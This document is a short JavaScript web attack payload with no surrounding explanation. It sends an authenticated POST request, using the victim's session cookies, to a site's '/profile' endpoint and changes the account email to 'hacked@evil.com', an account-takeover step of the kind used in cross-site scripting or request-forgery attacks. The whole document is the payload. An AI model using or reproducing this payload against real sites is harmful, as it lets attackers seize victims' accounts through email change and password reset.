fetch("/profile", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: "email=hacked@evil.com",
    credentials: "include"   
});
